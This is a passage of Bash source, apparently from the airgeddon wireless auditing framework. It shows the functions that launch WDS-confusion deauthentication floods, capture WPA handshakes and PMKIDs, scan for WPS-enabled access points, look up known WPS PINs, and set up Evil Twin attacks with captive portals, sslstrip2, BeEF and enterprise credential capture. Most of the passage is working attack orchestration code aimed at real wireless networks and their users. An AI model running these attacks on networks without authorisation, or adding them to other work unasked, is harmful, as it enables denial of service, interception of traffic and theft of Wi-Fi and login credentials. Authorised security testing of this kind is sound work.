				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"wids / wips / wds confusion attack\"" "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "${mdk_command} ${interface} w -e ${essid} -c ${channel}"
					processidattack="${global_process_pid}"
					global_process_pid=""
				fi
				sleeptimeattack=16
				launch_handshake_capture
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	dos_handshake_menu
}

#Handshake capture launcher
function launch_handshake_capture() {

	debug_print

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		processidattack=$!
		sleep ${sleeptimeattack} && kill ${processidattack} &> /dev/null
	else
		sleep ${sleeptimeattack} && kill ${processidattack} && kill_tmux_windows "Capturing Handshake" &> /dev/null
	fi

	handshake_capture_check

	if check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "showing_msgs_capturing" "also_pmkid"; then

		handshakepath="${default_save_path}"
		handshakefilename="handshake-${bssid}.cap"
		handshakepath="${handshakepath}${handshakefilename}"

		echo
		language_strings "${language}" 162 "yellow"
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "handshake"
		done

		cp "${tmpdir}${standardhandshake_filename}" "${enteredpath}"
		echo
		language_strings "${language}" 149 "blue"
		language_strings "${language}" 115 "read"
		return_to_handshake_pmkid_tools_menu=1
	else
		echo
		language_strings "${language}" 146 "red"
		language_strings "${language}" 115 "read"
	fi
}

#Launch the Handshake capture window
function capture_handshake_window() {

	debug_print

	echo
	language_strings "${language}" 143 "blue"
	echo
	language_strings "${language}" 144 "yellow"
	language_strings "${language}" 115 "read"
	echo
	language_strings "${language}" 325 "blue"

	rm -rf "${tmpdir}handshake"* > /dev/null 2>&1
	recalculate_windows_sizes
	manage_output "+j -sb -rightbar -geometry ${g1_topright_window} -T \"Capturing Handshake\"" "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}handshake ${interface}" "Capturing Handshake" "active"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		get_tmux_process_id "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}handshake ${interface}"
		processidcapture="${global_process_pid}"
		global_process_pid=""
	else
		processidcapture=$!
	fi
}

#Launch the PMKID capture window
function launch_pmkid_capture() {

	debug_print

	ask_timeout "capture_pmkid"
	rm -rf "${tmpdir}target.txt" > /dev/null 2>&1
	echo "${bssid//:}" > "${tmpdir}target.txt"

	echo
	language_strings "${language}" 671 "yellow"
	language_strings "${language}" 115 "read"
	echo
	language_strings "${language}" 325 "blue"

	if compare_floats_greater_or_equal "${hcxdumptool_version}" "${minimum_hcxdumptool_filterap_version}"; then
		hcxdumptool_filter="--filterlist_ap="
	else
		hcxdumptool_filter="--filterlist="
	fi

	rm -rf "${tmpdir}pmkid"* > /dev/null 2>&1
	recalculate_windows_sizes
	manage_output "+j -sb -rightbar -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g1_topright_window} -T \"Capturing PMKID\"" "timeout -s SIGTERM ${timeout_capture_pmkid} hcxdumptool -i ${interface} --enable_status=1 ${hcxdumptool_filter}${tmpdir}target.txt --filtermode=2 -o ${tmpdir}pmkid.pcapng" "Capturing PMKID" "active"
	wait_for_process "timeout -s SIGTERM ${timeout_capture_pmkid} hcxdumptool -i ${interface} --enable_status=1 ${hcxdumptool_filter}${tmpdir}target.txt --filtermode=2 -o ${tmpdir}pmkid.pcapng" "Capturing PMKID"

	if hcxpcapngtool -o "${tmpdir}${standardpmkid_filename}" "${tmpdir}pmkid.pcapng" | grep -Eq "PMKID(\(s\))? written" 2> /dev/null; then
		pmkidpath="${default_save_path}"
		pmkidfilename="pmkid-${bssid}.txt"
		pmkidpath="${pmkidpath}${pmkidfilename}"

		echo
		language_strings "${language}" 162 "yellow"
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "pmkid"
		done

		cp "${tmpdir}${standardpmkid_filename}" "${enteredpath}" > /dev/null 2>&1

		echo
		language_strings "${language}" 673 "blue"
		ask_yesno 684 "yes"
		if [ "${yesno}" = "y" ]; then
			if hash tshark 2> /dev/null; then
				tshark -r "${tmpdir}pmkid.pcapng" -R "(wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05 || eapol && wlan.addr==${bssid})" -2 -w "${tmpdir}pmkid_transformed.cap" -F pcap > /dev/null 2>&1

				pmkidcappath="${default_save_path}"
				pmkidcapfilename="pmkid-${bssid}.cap"
				pmkidcappath="${pmkidcappath}${pmkidcapfilename}"

				validpath=1
				while [[ "${validpath}" != "0" ]]; do
					read_path "pmkidcap"
				done

				cp "${tmpdir}pmkid_transformed.cap" "${enteredpath}" > /dev/null 2>&1

				echo
				language_strings "${language}" 673 "blue"
				language_strings "${language}" 115 "read"
			else
				echo
				language_strings "${language}" 685 "red"
				language_strings "${language}" 115 "read"
			fi
		fi
	else
		echo
		language_strings "${language}" 672 "red"
		language_strings "${language}" 115 "read"
	fi
}

#Manage target exploration and parse the output files
function explore_for_targets_option() {

	debug_print

	echo
	language_strings "${language}" 103 "title"
	language_strings "${language}" 65 "green"

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	echo
	language_strings "${language}" 66 "yellow"
	echo

	local cypher_filter
	if [ -n "${1}" ]; then
		cypher_filter="${1}"
		case ${cypher_filter} in
			"WEP")
				language_strings "${language}" 67 "yellow"
			;;
			"WPA")
				if [[ -n "${2}" ]] && [[ "${2}" = "enterprise" ]]; then
					language_strings "${language}" 527 "yellow"
				else
					language_strings "${language}" 361 "yellow"
				fi
			;;
		esac
		cypher_cmd=" --encrypt ${cypher_filter} "
	else
		cypher_filter=""
		cypher_cmd=" "
		language_strings "${language}" 366 "yellow"
	fi
	language_strings "${language}" 115 "read"

	tmpfiles_toclean=1
	rm -rf "${tmpdir}nws"* > /dev/null 2>&1
	rm -rf "${tmpdir}clts.csv" > /dev/null 2>&1

	if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
		airodump_band_modifier="bg"
	else
		airodump_band_modifier="abg"
	fi

	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Exploring for targets\"" "airodump-ng -w ${tmpdir}nws${cypher_cmd}${interface} --band ${airodump_band_modifier}" "Exploring for targets" "active"
	wait_for_process "airodump-ng -w ${tmpdir}nws${cypher_cmd}${interface} --band ${airodump_band_modifier}" "Exploring for targets"
	targetline=$(awk '/(^Station[s]?|^Client[es]?)/{print NR}' < "${tmpdir}nws-01.csv")
	targetline=$((targetline - 1))

	head -n "${targetline}" "${tmpdir}nws-01.csv" &> "${tmpdir}nws.csv"
	tail -n +"${targetline}" "${tmpdir}nws-01.csv" &> "${tmpdir}clts.csv"

	csvline=$(wc -l "${tmpdir}nws.csv" 2> /dev/null | awk '{print $1}')
	if [ "${csvline}" -le 3 ]; then
		echo
		language_strings "${language}" 68 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	rm -rf "${tmpdir}nws.txt" > /dev/null 2>&1
	rm -rf "${tmpdir}wnws.txt" > /dev/null 2>&1
	local i=0
	local enterprise_network_counter
	while IFS=, read -r exp_mac _ _ exp_channel _ exp_enc _ exp_auth exp_power _ _ _ exp_idlength exp_essid _; do

		chars_mac=${#exp_mac}
		if [ "${chars_mac}" -ge 17 ]; then
			i=$((i + 1))
			if [[ ${exp_power} -lt 0 ]]; then
				if [[ ${exp_power} -eq -1 ]]; then
					exp_power=0
				else
					exp_power=$((exp_power + 100))
				fi
			fi

			exp_power=$(echo "${exp_power}" | awk '{gsub(/ /,""); print}')
			exp_essid=${exp_essid:1:${exp_idlength}}

			if [[ ${exp_channel} =~ ${valid_channels_24_and_5_ghz_regexp} ]]; then
				exp_channel=$(echo "${exp_channel}" | awk '{gsub(/ /,""); print}')
			else
				exp_channel=0
			fi

			if [[ "${exp_essid}" = "" ]] || [[ "${exp_channel}" = "-1" ]]; then
				exp_essid="(Hidden Network)"
			fi

			exp_enc=$(echo "${exp_enc}" | awk '{print $1}')

			if [[ -n "${2}" ]] && [[ "${2}" = "enterprise" ]]; then
				if [[ "${exp_auth}" =~ "MGT" ]]; then
					enterprise_network_counter=$((enterprise_network_counter + 1))
					echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
				fi
			else
				echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
			fi
		fi
	done < "${tmpdir}nws.csv"

	if [[ -n "${2}" ]] && [[ "${2}" = "enterprise" ]] && [[ ${enterprise_network_counter} -eq 0 ]]; then
		echo
		language_strings "${language}" 612 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	sort -t "," -d -k 4 "${tmpdir}nws.txt" > "${tmpdir}wnws.txt"
	select_target
}

#Manage target exploration only for Access Points with WPS activated. Parse output files and print menu with results
function explore_for_wps_targets_option() {

	debug_print

	echo
	language_strings "${language}" 103 "title"
	language_strings "${language}" 65 "green"

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	echo
	language_strings "${language}" 66 "yellow"
	echo
	if ! grep -qe "${interface}" <(echo "${!wash_ifaces_already_set[@]}"); then
		language_strings "${language}" 353 "blue"
		set_wash_parameterization
		language_strings "${language}" 354 "yellow"
	else
		language_strings "${language}" 355 "blue"
	fi

	wash_band_modifier=""
	if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 1 ]; then
		if check_dual_scan_on_wash; then
			wash_band_modifier=" -2 -5"
		else
			ask_yesno 145 "no"
			if [ "${yesno}" = "y" ]; then
				wash_band_modifier=" -5"
			fi
		fi
	fi

	echo
	language_strings "${language}" 411 "yellow"
	language_strings "${language}" 115 "read"

	tmpfiles_toclean=1
	rm -rf "${tmpdir}wps"* > /dev/null 2>&1

	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Exploring for WPS targets\"" "wash -i \"${interface}\"${wash_ifaces_already_set[${interface}]}${wash_band_modifier} | tee \"${tmpdir}wps.txt\"" "Exploring for WPS targets" "active"
	wait_for_process "wash -i \"${interface}\"${wash_ifaces_already_set[${interface}]}${wash_band_modifier}" "Exploring for WPS targets"

	readarray -t WASH_PREVIEW < <(cat < "${tmpdir}wps.txt" 2> /dev/null)

	wash_header_found=0
	wash_line_counter=1
	for item in "${WASH_PREVIEW[@]}"; do
		if [[ ${item} =~ -{20} ]]; then
			wash_start_data_line="${wash_line_counter}"
			wash_header_found=1
			break
		else
			wash_line_counter=$((wash_line_counter + 1))
		fi
	done

	if [ "${wash_header_found}" -eq 0 ]; then
		echo
		language_strings "${language}" 417 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	washlines=$(wc -l "${tmpdir}wps.txt" 2> /dev/null | awk '{print $1}')
	if [ "${washlines}" -le ${wash_start_data_line} ]; then
		echo
		language_strings "${language}" 68 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	clear
	language_strings "${language}" 104 "title"
	echo
	language_strings "${language}" 349 "green"
	print_large_separator

	local i=0
	local wash_counter=0
	declare -A wps_lockeds
	wps_lockeds[${wash_counter}]="No"
	while IFS=, read -r expwps_line; do

		i=$((i + 1))

		if [ ${i} -le ${wash_start_data_line} ]; then
			continue
		else
			wash_counter=$((wash_counter + 1))

			if [ ${wash_counter} -le 9 ]; then
				wpssp1=" "
			else
				wpssp1=""
			fi

			expwps_bssid=$(echo "${expwps_line}" | awk '{print $1}')
			expwps_channel=$(echo "${expwps_line}" | awk '{print $2}')
			expwps_power=$(echo "${expwps_line}" | awk '{print $3}')
			expwps_locked=$(echo "${expwps_line}" | awk '{print $5}')
			expwps_essid=$(echo "${expwps_line//[\`\']/}" | awk -F '\t| {2,}' '{print $NF}')

			if [[ ${expwps_channel} -le 9 ]]; then
				wpssp2="  "
				if [[ ${expwps_channel} -eq 0 ]]; then
					expwps_channel="-"
				fi
			elif [[ ${expwps_channel} -ge 10 ]] && [[ ${expwps_channel} -lt 99 ]]; then
				wpssp2=" "
			else
				wpssp2=""
			fi

			if [[ "${expwps_power}" = "" ]] || [[ "${expwps_power}" = "-00" ]]; then
				expwps_power=0
			fi

			if [[ ${expwps_power} =~ ^-0 ]]; then
				expwps_power=${expwps_power//0/}
			fi

			if [[ ${expwps_power} -lt 0 ]]; then
				if [[ ${expwps_power} -eq -1 ]]; then
					expwps_power=0
				else
					expwps_power=$((expwps_power + 100))
				fi
			fi

			if [[ ${expwps_power} -le 9 ]]; then
				wpssp4=" "
			else
				wpssp4=""
			fi

			wash_color="${normal_color}"
			if [ "${expwps_locked}" = "Yes" ]; then
				wash_color="${red_color}"
				wpssp3=""
			else
				wpssp3=" "
			fi

			wps_network_names[$wash_counter]=${expwps_essid}
			wps_channels[$wash_counter]=${expwps_channel}
			wps_macs[$wash_counter]=${expwps_bssid}
			wps_lockeds[$wash_counter]=${expwps_locked}
			echo -e "${wash_color} ${wpssp1}${wash_counter})   ${expwps_bssid}  ${wpssp2}${expwps_channel}    ${wpssp4}${expwps_power}%     ${expwps_locked}${wpssp3}   ${expwps_essid}"
		fi
	done < "${tmpdir}wps.txt"

	echo
	if [ ${wash_counter} -eq 1 ]; then
		language_strings "${language}" 70 "yellow"
		selected_wps_target_network=1
		language_strings "${language}" 115 "read"
	else
		print_large_separator
		language_strings "${language}" 3 "green"
		read -rp "> " selected_wps_target_network
	fi

	while [[ ! ${selected_wps_target_network} =~ ^[[:digit:]]+$ ]] || (( selected_wps_target_network < 1 || selected_wps_target_network > wash_counter )) || [[ ${wps_lockeds[${selected_wps_target_network}]} = "Yes" ]]; do

		if [[ ${selected_wps_target_network} =~ ^[[:digit:]]+$ ]] && (( selected_wps_target_network >= 1 && selected_wps_target_network <= wash_counter )); then
			if [ "${wps_lockeds[${selected_wps_target_network}]}" = "Yes" ]; then
				ask_yesno 350 "no"
				if [ "${yesno}" = "y" ]; then
					break
				else
					echo
					language_strings "${language}" 3 "green"
					read -rp "> " selected_wps_target_network
					continue
				fi
			fi
		fi

		echo
		language_strings "${language}" 72 "red"
		echo
		language_strings "${language}" 3 "green"
		read -rp "> " selected_wps_target_network
	done

	wps_essid=${wps_network_names[${selected_wps_target_network}]}
	wps_channel=${wps_channels[${selected_wps_target_network}]}
	wps_bssid=${wps_macs[${selected_wps_target_network}]}
	wps_locked=${wps_lockeds[${selected_wps_target_network}]}
}

#Create a menu to select target from the parsed data
function select_target() {

	debug_print

	clear
	language_strings "${language}" 104 "title"
	echo
	language_strings "${language}" 69 "green"
	print_large_separator
	local i=0
	while IFS=, read -r exp_mac exp_channel exp_power exp_essid exp_enc; do

		i=$((i + 1))

		if [ ${i} -le 9 ]; then
			sp1=" "
		else
			sp1=""
		fi

		if [[ ${exp_channel} -le 9 ]]; then
			sp2="  "
			if [[ ${exp_channel} -eq 0 ]]; then
				exp_channel="-"
			fi
			if [[ ${exp_channel} -lt 0 ]]; then
				sp2=" "
			fi
		elif [[ ${exp_channel} -ge 10 ]] && [[ ${exp_channel} -lt 99 ]]; then
			sp2=" "
		else
			sp2=""
		fi

		if [[ "${exp_power}" = "" ]]; then
			exp_power=0
		fi

		if [[ ${exp_power} -le 9 ]]; then
			sp4=" "
		else
			sp4=""
		fi

		airodump_color="${normal_color}"
		client=$(grep "${exp_mac}" < "${tmpdir}clts.csv")
		if [ "${client}" != "" ]; then
			airodump_color="${yellow_color}"
			client="*"
			sp5=""
		else
			sp5=" "
		fi

		enc_length=${#exp_enc}
		if [ "${enc_length}" -gt 3 ]; then
			sp6=""
		elif [ "${enc_length}" -eq 0 ]; then
			sp6="    "
		else
			sp6=" "
		fi

		network_names[$i]=${exp_essid}
		channels[$i]=${exp_channel}
		macs[$i]=${exp_mac}
		encs[$i]=${exp_enc}
		echo -e "${airodump_color} ${sp1}${i})${client}  ${sp5}${exp_mac}  ${sp2}${exp_channel}    ${sp4}${exp_power}%   ${exp_enc}${sp6}   ${exp_essid}"
	done < "${tmpdir}wnws.txt"

	echo
	if [ ${i} -eq 1 ]; then
		language_strings "${language}" 70 "yellow"
		selected_target_network=1
		language_strings "${language}" 115 "read"
	else
		language_strings "${language}" 71 "yellow"
		print_large_separator
		language_strings "${language}" 3 "green"
		read -rp "> " selected_target_network
	fi

	while [[ ! ${selected_target_network} =~ ^[[:digit:]]+$ ]] || (( selected_target_network < 1 || selected_target_network > i )); do
		echo
		language_strings "${language}" 72 "red"
		echo
		language_strings "${language}" 3 "green"
		read -rp "> " selected_target_network
	done

	essid=${network_names[${selected_target_network}]}
	channel=${channels[${selected_target_network}]}
	bssid=${macs[${selected_target_network}]}
	enc=${encs[${selected_target_network}]}
}

#Perform a test to determine if fcs parameter is needed on wash scanning
function set_wash_parameterization() {

	debug_print

	fcs=""
	declare -gA wash_ifaces_already_set
	readarray -t WASH_OUTPUT < <(timeout -s SIGTERM 2 wash -i "${interface}" 2> /dev/null)

	for item in "${WASH_OUTPUT[@]}"; do
		if [[ ${item} =~ ^\[\!\].*bad[[:space:]]FCS ]]; then
			fcs=" -C "
			break
		fi
	done

	wash_ifaces_already_set[${interface}]=${fcs}
}

#Check if a type exists in the wps data array
function check_if_type_exists_in_wps_data_array() {

	debug_print

	[[ -n "${wps_data_array["${1}","${2}"]:+not set}" ]]
}

#Check if a pin exists in the wps data array
function check_if_pin_exists_in_wps_data_array() {

	debug_print

	[[ "${wps_data_array["${1}","${2}"]}" =~ (^| )"${3}"( |$) ]]
}

#Fill data into wps data array
function fill_wps_data_array() {

	debug_print

	if ! check_if_pin_exists_in_wps_data_array "${1}" "${2}" "${3}"; then

		if [ "${2}" != "Database" ]; then
			wps_data_array["${1}","${2}"]="${3}"
		else
			if [ "${wps_data_array["${1}","${2}"]}" = "" ]; then
				wps_data_array["${1}","${2}"]="${3}"
			else
				wps_data_array["${1}","${2}"]="${wps_data_array["${1}","${2}"]} ${3}"
			fi
		fi
	fi
}

#Manage and validate the prerequisites for wps pin database attacks
function wps_pin_database_prerequisites() {

	debug_print

	set_wps_mac_parameters

	#shellcheck source=./known_pins.db
	source "${scriptfolder}${known_pins_dbfile}"

	echo
	language_strings "${language}" 384 "blue"
	echo
	search_in_pin_database
	if [ "${bssid_found_in_db}" -eq 1 ]; then
		if [ "${counter_pins_found}" -eq 1 ]; then
			language_strings "${language}" 385 "yellow"
		else
			language_strings "${language}" 386 "yellow"
		fi
	else
		language_strings "${language}" 387 "yellow"
	fi

	if [ "${1}" != "no_attack" ]; then
		check_and_set_common_algorithms
		echo
		language_strings "${language}" 4 "read"
	fi
}

#Manage and validate the prerequisites for Evil Twin and Enterprise attacks
function et_prerequisites() {

	debug_print

	if [ ${retry_handshake_capture} -eq 1 ]; then
		return
	fi

	clear
	if [ -n "${enterprise_mode}" ]; then
		current_menu="enterprise_attacks_menu"
		case ${enterprise_mode} in
			"smooth")
				language_strings "${language}" 522 "title"
			;;
			"noisy")
				language_strings "${language}" 523 "title"
			;;
		esac
	else
		current_menu="evil_twin_attacks_menu"
		case ${et_mode} in
			"et_onlyap")
				language_strings "${language}" 270 "title"
			;;
			"et_sniffing")
				language_strings "${language}" 291 "title"
			;;
			"et_sniffing_sslstrip2")
				language_strings "${language}" 292 "title"
			;;
			"et_sniffing_sslstrip2_beef")
				language_strings "${language}" 397 "title"
			;;
			"et_captive_portal")
				language_strings "${language}" 293 "title"
			;;
		esac
	fi

	print_iface_selected
	if [ -n "${enterprise_mode}" ]; then
		print_all_target_vars
	else
		print_et_target_vars
		print_iface_internet_selected
	fi

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 512 "blue"
	fi
	print_hint ${current_menu}
	echo

	if [ "${et_mode}" != "et_captive_portal" ]; then
		language_strings "${language}" 275 "blue"
		echo
		language_strings "${language}" 276 "yellow"
		print_simple_separator
		ask_yesno 277 "yes"
		if [ "${yesno}" = "n" ]; then
			if [ -n "${enterprise_mode}" ]; then
				return_to_enterprise_main_menu=1
			else
				return_to_et_main_menu=1
				return_to_et_main_menu_from_beef=1
			fi
			return
		fi
	fi

	if [[ -z "${mac_spoofing_desired}" ]] || [[ ${mac_spoofing_desired} -eq 0 ]]; then
		ask_yesno 419 "no"
		if [ "${yesno}" = "y" ]; then
			mac_spoofing_desired=1
		fi
	fi

	if [ "${et_mode}" = "et_captive_portal" ]; then

		language_strings "${language}" 315 "yellow"
		echo
		language_strings "${language}" 286 "pink"
		print_simple_separator
		if [ ${retrying_handshake_capture} -eq 0 ]; then
			ask_yesno 321 "no"
		fi

		local msg_mode
		msg_mode="showing_msgs_checking"

		if [[ ${yesno} = "n" ]] || [[ ${retrying_handshake_capture} -eq 1 ]]; then
			msg_mode="silent"
			capture_handshake_evil_twin
			case "$?" in
				"2")
					retry_handshake_capture=1
					return
				;;
				"1")
					return_to_et_main_menu=1
					return
				;;
			esac
		else
			ask_et_handshake_file
		fi
		retry_handshake_capture=0
		retrying_handshake_capture=0

		if ! check_bssid_in_captured_file "${et_handshake}" "${msg_mode}" "also_pmkid"; then
			return_to_et_main_menu=1
			return
		fi

		echo
		language_strings "${language}" 28 "blue"

		echo
		language_strings "${language}" 26 "blue"

		echo
		language_strings "${language}" 31 "blue"
	else
		if ! ask_bssid; then
			if [ -n "${enterprise_mode}" ]; then
				return_to_enterprise_main_menu=1
			else
				return_to_et_main_menu=1
				return_to_et_main_menu_from_beef=1
			fi
			return
		fi

		if ! ask_channel; then
			if [ -n "${enterprise_mode}" ]; then
				return_to_enterprise_main_menu=1
			else
				return_to_et_main_menu=1
			fi
			return
		else
			if [[ "${dos_pursuit_mode}" -eq 1 ]] && [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]] && [[ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]]; then
				echo
				language_strings "${language}" 394 "red"
				language_strings "${language}" 115 "read"
				if [ -n "${enterprise_mode}" ]; then
					return_to_enterprise_main_menu=1
				else
					return_to_et_main_menu=1
				fi
				return
			fi
		fi
		ask_essid "noverify"
	fi

	if [ -n "${enterprise_mode}" ]; then
		manage_enterprise_log
	elif [[ "${et_mode}" = "et_sniffing" ]]; then
		manage_ettercap_log
	elif [[ "${et_mode}" = "et_sniffing_sslstrip2" ]] || [[ "${et_mode}" = "et_sniffing_sslstrip2_beef" ]]; then
		manage_bettercap_log
	elif [ "${et_mode}" = "et_captive_portal" ]; then
		manage_captive_portal_log
		language_strings "${language}" 115 "read"
		if set_captive_portal_language; then
			language_strings "${language}" 319 "blue"
		else
			return
		fi
	fi

	if [ -n "${enterprise_mode}" ]; then
		return_to_enterprise_main_menu=1
	else
		return_to_et_main_menu=1
		return_to_et_main_menu_from_beef=1
	fi

	if [ "${is_docker}" -eq 1 ]; then
		echo
		if [ -n "${enterprise_mode}" ]; then
			language_strings "${language}" 528 "pink"
		else
			language_strings "${language}" 420 "pink"
		fi
		language_strings "${language}" 115 "read"
	fi

	if [[ "${channel}" -gt 14 ]]; then
		echo
		language_strings "${language}" 392 "blue"
	fi

	echo
	language_strings "${language}" 296 "yellow"
	language_strings "${language}" 115 "read"
	prepare_et_interface

	if [ -n "${enterprise_mode}" ]; then
		exec_enterprise_attack
	else
		case ${et_mode} in
			"et_onlyap")
				exec_et_onlyap_attack
			;;
			"et_sniffing")
				exec_et_sniffing_attack
			;;
			"et_sniffing_sslstrip2")
				exec_et_sniffing_sslstrip2_attack
			;;
			"et_sniffing_sslstrip2_beef")
				exec_et_sniffing_sslstrip2_beef_attack
			;;
			"et_captive_portal")
				exec_et_captive_portal_attack
			;;
		esac
	fi
}

#Manage the Handshake file requirement for captive portal Evil Twin attack
function ask_et_handshake_file() {

	debug_print

	echo
	readpath=0

	if [[ -z "${enteredpath}" ]] && [[ -z "${et_handshake}" ]]; then
		language_strings "${language}" 312 "blue"
		readpath=1
	elif [[ -z "${enteredpath}" ]] && [[ -n "${et_handshake}" ]]; then
		language_strings "${language}" 313 "blue"
		ask_yesno 187 "yes"
		if [ "${yesno}" = "n" ]; then
			readpath=1
		fi
	elif [[ -n "${enteredpath}" ]] && [[ -z "${et_handshake}" ]]; then
		language_strings "${language}" 151 "blue"
		ask_yesno 187 "yes"
		if [ "${yesno}" = "y" ]; then
			et_handshake="${enteredpath}"
		else
			readpath=1
		fi
	elif [[ -n "${enteredpath}" ]] && [[ -n "${et_handshake}" ]]; then
		language_strings "${language}" 313 "blue"
		ask_yesno 187 "yes"
		if [ "${yesno}" = "n" ]; then
			readpath=1
		fi
	fi

	if [ ${readpath} -eq 1 ]; then
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "ethandshake"
		done
	fi
}

#DoS Evil Twin and Enterprise attacks menu
function et_dos_menu() {

	debug_print

	if [[ -n "${return_to_et_main_menu}" ]] && [[ ${return_to_et_main_menu} -eq 1 ]]; then
		return
	fi

	if [[ -n "${return_to_enterprise_main_menu}" ]] && [[ ${return_to_enterprise_main_menu} -eq 1 ]]; then
		return
	fi

	clear
	if [ "${1}" = "enterprise" ]; then
		language_strings "${language}" 520 "title"
	else
		language_strings "${language}" 265 "title"
	fi
	current_menu="et_dos_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	if [ "${1}" = "enterprise" ]; then
		language_strings "${language}" 521
	else
		language_strings "${language}" 266
	fi
	print_simple_separator
	language_strings "${language}" 139 mdk_attack_dependencies[@]
	language_strings "${language}" 140 aireplay_attack_dependencies[@]
	language_strings "${language}" 141 mdk_attack_dependencies[@]
	print_hint ${current_menu}

	read -rp "> " et_dos_option
	case ${et_dos_option} in
		0)
			if [ "${1}" != "enterprise" ]; then
				return_to_et_main_menu_from_beef=1
			fi
			return
		;;
		1)
			if contains_element "${et_dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				et_dos_attack="${mdk_command}"

				echo
				language_strings "${language}" 509 "yellow"

				if ! dos_pursuit_mode_et_handler; then
					return
				fi

				if [[ "${et_mode}" = "et_captive_portal" ]] || [[ -n "${enterprise_mode}" ]]; then
					et_prerequisites
				else
					if detect_internet_interface; then
						et_prerequisites
					else
						return
					fi
				fi
			fi
		;;
		2)
			if contains_element "${et_dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				et_dos_attack="Aireplay"

				echo
				language_strings "${language}" 509 "yellow"

				if ! dos_pursuit_mode_et_handler; then
					return
				fi

				if [[ "${et_mode}" = "et_captive_portal" ]] || [[ -n "${enterprise_mode}" ]]; then
					et_prerequisites
				else
					if detect_internet_interface; then
						et_prerequisites
					else
						return
					fi
				fi
			fi
		;;
		3)
			if contains_element "${et_dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				et_dos_attack="Wds Confusion"

				echo
				language_strings "${language}" 509 "yellow"

				if ! dos_pursuit_mode_et_handler; then
					return
				fi

				if [[ "${et_mode}" = "et_captive_portal" ]] || [[ -n "${enterprise_mode}" ]]; then
					et_prerequisites
				else
					if detect_internet_interface; then
						et_prerequisites
					else
						return
					fi
				fi
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	if [ "${1}" = "enterprise" ]; then
		et_dos_menu "${1}"
	else
		et_dos_menu
	fi
}

#Selected internet interface detection
function detect_internet_interface() {

	debug_print

	if [ ${internet_interface_selected} -eq 1 ]; then
		return 0
	fi

	if [ -n "${internet_interface}" ]; then
		echo
		language_strings "${language}" 285 "blue"
		ask_yesno 284 "yes"
		if [ "${yesno}" = "n" ]; then
			if ! select_secondary_et_interface "internet"; then
				return 1
			fi
		fi
	else
		if ! select_secondary_et_interface "internet"; then
			return 1
		fi
	fi

	validate_et_internet_interface
	return $?
}

#Show about and credits
function credits_option() {

	debug_print

	clear
	language_strings "${language}" 105 "title"
	language_strings "${language}" 74 "pink"
	echo
	language_strings "${language}" 73 "blue"
	echo
	echo -e "${green_color}                                                            .-\"\"\"\"-."
	sleep 0.15 && echo -e "                                                           /        \ "
	sleep 0.15 && echo -e "${yellow_color}         ____        ____  __   _______                  ${green_color} /_        _\ "
	sleep 0.15 && echo -e "${yellow_color}  ___  _/_   | _____/_   |/  |_ \   _  \_______         ${green_color} // \      / \\\\\ "
	sleep 0.15 && echo -e "${yellow_color}  \  \/ /|   |/  ___/|   \   __\/  /_\  \_  __ \        ${green_color} |\__\    /__/|"
	sleep 0.15 && echo -e "${yellow_color}   \   / |   |\___ \ |   ||  |  \  \_/   \  | \/         ${green_color} \    ||    /"
	sleep 0.15 && echo -e "${yellow_color}    \_/  |___/____  >|___||__|   \_____  /__|             ${green_color} \        /"
	sleep 0.15 && echo -e "${yellow_color}                  \/                   \/                  ${green_color} \  __  / "
	sleep 0.15 && echo -e "                                                             '.__.'"
	sleep 0.15 && echo -e "                                                              |  |${normal_color}"
	echo
	language_strings "${language}" 75 "blue"
	echo
	language_strings "${language}" 85 "pink"
	language_strings "${language}" 107 "pink"
	language_strings "${language}" 421 "pink"
	echo
	language_strings "${language}" 115 "read"
}

#Show message for invalid selected language
function invalid_language_selected() {

	debug_print

	echo
	language_strings "${language}" 82 "red"
	echo
	language_strings "${language}" 115 "read"
}

#Show message for captive portal invalid selected language
function invalid_captive_portal_language_selected() {

	debug_print

	language_strings "${language}" 82 "red"
	echo
	language_strings "${language}" 115 "read"
	set_captive_portal_language
}

#Show message for forbidden selected option
function forbidden_menu_option() {

	debug_print

	echo
	language_strings "${language}" 220 "red"
	language_strings "${language}" 115 "read"
}

